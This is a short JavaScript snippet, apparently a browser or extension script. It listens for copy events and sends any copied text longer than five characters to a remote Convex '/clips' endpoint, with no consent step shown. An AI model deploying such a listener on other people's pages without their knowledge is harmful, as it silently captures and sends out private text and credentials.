const CONVEX_SITE_URL = "https://fantastic-condor-84.eu-west-1.convex.site";

document.addEventListener("copy", () => {
    const text = window.getSelection().toString();

    if(text.length > 5) {
        console.log("Captured:", text);

        fetch(`${CONVEX_SITE_URL}/clips`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: text }),
        });
    }
});